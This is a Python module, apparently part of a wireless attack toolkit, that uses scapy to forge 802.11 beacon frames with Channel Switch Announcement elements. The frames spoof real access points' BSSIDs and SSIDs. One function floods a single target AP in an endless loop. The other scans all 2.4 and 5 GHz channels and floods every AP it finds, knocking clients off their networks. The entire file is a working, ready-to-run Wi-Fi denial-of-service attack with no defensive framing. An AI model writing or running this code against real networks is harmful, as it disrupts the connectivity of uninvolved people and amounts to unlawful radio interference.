# csa
import os
import random
import subprocess
import time

from scapy.all import (
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    Dot11EltRates,
    RadioTap,
    sendp,
    sniff,
)
from scapy.error import Scapy_Exception

from debugs import debug

_HERE = os.path.dirname(os.path.abspath(__file__))

_ALL_24 = list(range(1, 14))
_ALL_5  = [
    36, 40, 44, 48,
    52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144,
    149, 153, 157, 161, 165,
]

_COMMON_24 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]

_COMMON_5  = [
    36, 40, 44, 48,
    52, 56, 60, 64,
    100, 104, 108, 112, 116,
    149, 153, 157, 161,
]

_IE_CSA = 37

_BCAST = "ff:ff:ff:ff:ff:ff"


def _auto_new_channel(current_channel):
    if current_channel in _ALL_24:
        pool = [c for c in _ALL_24 if c != current_channel]
    else:
        pool = [c for c in _ALL_5 if c != current_channel]
        if not pool:
            pool = [c for c in _ALL_24 if c != current_channel]
    return random.choice(pool)


def _build_csa_frame(bssid, ssid, client, channel,
                     new_channel, switch_count):
    dot11 = Dot11(type=0, subtype=8,
                  addr1=client, addr2=bssid, addr3=bssid)

    mode = 1
    csa_body = bytes([mode, new_channel & 0xFF, switch_count & 0xFF])
    csa_ie = Dot11Elt(ID=_IE_CSA, info=csa_body)

    frame = (
        RadioTap() / dot11
        / Dot11Beacon(cap="ESS")
        / Dot11Elt(ID="SSID", info=ssid)
        / Dot11EltRates(rates=[0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24])
        / Dot11Elt(ID="DSset", info=bytes([channel & 0xFF]))
        / csa_ie
    )
    return bytes(frame)


def _resolve_channels(channel_target, band):
    if channel_target is None or channel_target == "all":
        if band == 2:
            return list(_ALL_24)
        if band == 5:
            return list(_ALL_5)
        return _ALL_24 + _ALL_5

    if channel_target == "common":
        if band == 2:
            return list(_COMMON_24)
        if band == 5:
            return list(_COMMON_5)
        return _COMMON_24 + _COMMON_5

    if isinstance(channel_target, int):
        return [channel_target]
    return [int(c) for c in channel_target]

def _set_channel(iface, ch):
    try:
        subprocess.run(
            ["iw", "dev", iface, "set", "channel", str(ch)],
            capture_output=True, check=False, timeout=2,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass


def _scan_aps(iface, channels, dwell=0.4, timeout=15):
    aps = {}
    wanted = set(channels)

    def _handler(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return
        try:
            bssid = pkt[Dot11].addr3
            if bssid is None or bssid == _BCAST:
                return
            ssid = None
            ch = None
            elt = pkt.getlayer(Dot11Elt)
            while elt is not None:
                if elt.ID == 0 and elt.info is not None:
                    try:
                        ssid = elt.info.decode(errors="ignore")
                    except (UnicodeDecodeError, AttributeError) as e:
                        debug("warn", f"flood_csa: SSID decode failed: {e}")
                        ssid = ""
                elif elt.ID == 3 and elt.info:
                    ch = elt.info[0]
                elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, "getlayer") else None
            if ch is None or ch not in wanted:
                return
            aps[bssid] = {"bssid": bssid, "ssid": ssid or "", "channel": ch}
        except (AttributeError, IndexError, TypeError, Scapy_Exception) as e:
            debug("warn", f"flood_csa: handler parse error: {e}")
            return

    try:
        start = time.time()
        while time.time() - start < timeout and len(aps) < len(wanted):
            for ch in channels:
                if time.time() - start >= timeout:
                    break
                _set_channel(iface, ch)
                sniff(iface=iface, prn=_handler, timeout=dwell, store=False)
    except KeyboardInterrupt:
        debug("info", "flood_csa: scan interrupted")
        raise
    return list(aps.values())


def targeted_csa(iface, bssid, ssid, channel):
    new_channel  = _auto_new_channel(channel)
    switch_count = random.randint(1, 3)

    raw = _build_csa_frame(bssid, ssid, _BCAST, channel,
                           new_channel, switch_count)

    debug("ok", f"targeted_csa: running on {bssid} (ch {channel} -> {new_channel})")

    while True:
        try:
            sendp(raw, iface=iface, count=2, verbose=False,
                  realtime=False, inter=0)
        except PermissionError:
            debug("critical", "targeted_csa: permission denied")
            return
        except OSError as e:
            debug("error", f"targeted_csa: failed: {e}")
            return
        except KeyboardInterrupt:
            debug("info", "targeted_csa: interrupted by user")
            return
        time.sleep(0.0003)


def flood_csa(iface, band=None, channel_target=None, timeout=15):
    channels = _resolve_channels(channel_target, band)

    debug("info", f"flood_csa: scanning {len(channels)} channel(s)")

    aps = _scan_aps(iface, channels, timeout=timeout)
    if not aps:
        debug("warn", "flood_csa: no APs found")
        return

    frames = [
        _build_csa_frame(
            ap["bssid"], ap["ssid"], _BCAST,
            ap["channel"], _auto_new_channel(ap["channel"]),
            random.randint(1, 3),
        )
        for ap in aps
    ]

    debug("ok", f"flood_csa: running on {len(frames)} AP(s)")

    while True:
        for raw in frames:
            try:
                sendp(raw, iface=iface, count=1, verbose=False,
                      realtime=False, inter=0)
            except PermissionError:
                debug("critical", "flood_csa: permission denied")
                return
            except OSError as e:
                debug("error", f"flood_csa: failed: {e}")
                return
            except KeyboardInterrupt:
                debug("info", "flood_csa: interrupted by user")
                return
            time.sleep(0.0005)